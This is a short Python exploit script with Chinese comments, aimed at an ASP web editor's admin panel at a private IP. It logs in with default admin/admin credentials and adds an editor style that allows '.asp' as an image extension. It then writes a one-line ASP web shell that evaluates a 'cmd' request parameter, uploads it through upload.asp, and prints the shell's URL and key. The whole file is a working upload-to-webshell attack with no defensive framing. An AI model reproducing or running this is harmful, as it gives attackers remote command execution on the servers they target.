import requests

url="http://172.16.12.2"
usr='admin'
pwd='admin'
stylename='hack'
key='cmd'

s=requests.session()

# 登陆
data={'usr':usr,'pwd':pwd}
s.post(url+'/?action=login',data)

# 新建样式表
data={'d_name':stylename,'d_initmode':'EDIT','d_uploadobject':'0','d_autodir':'0','d_dir':'standard','d_css':'office','d_width':'550','d_height':'350','d_stateflag':'1','d_detectfromword':'true','d_autoremote':'1','d_showborder':'0','d_baseurl':'1','d_uploaddir':'UploadFile/','d_imageext':'asp','d_imagesize':'0'}
s.post(url+'/admin_style.asp?action=StyleAddSave&id=',data)

# 要上传的文件
f=open('shell.asp','w')
f.write('<%eval request("'+key+'")%>')
f.close()

# 上传并返回路径
f={'uploadfile':open('shell.asp','rb')}
r=s.post(url+"/upload.asp?action=save&type=IMAGE&style="+stylename,files=f).content
i=r.find(b"d(")
r=r[i+104:]
i=r.find(b"'")
print("URL: "+url+r[:i].decode())
print("key is: "+key)
